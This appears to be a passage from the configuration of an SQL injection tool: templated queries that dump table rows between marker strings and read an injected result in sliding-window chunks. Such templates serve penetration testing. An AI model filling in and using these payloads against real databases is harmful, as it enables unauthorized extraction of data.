row.query:
SELECT 
    '${ENCLOSE_VALUE_SQL}'
    ||r
    ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
from (
    select 
        ${FIELDS} r, 
        ROW_NUMBER() over (ORDER BY 1) AS rnum
    from ${DATABASE}.${TABLE}
)x
where 1=1
{limit}

configuration.slidingWindow:
select
    /**
     * If reach end of string (SQLii) then NULLIF nullifies the result
     */
    'SQLi'||NULLIF(substr(
    (${INJECTION}),
    ${INDEX}
    ),'${TRAIL_SQL}')
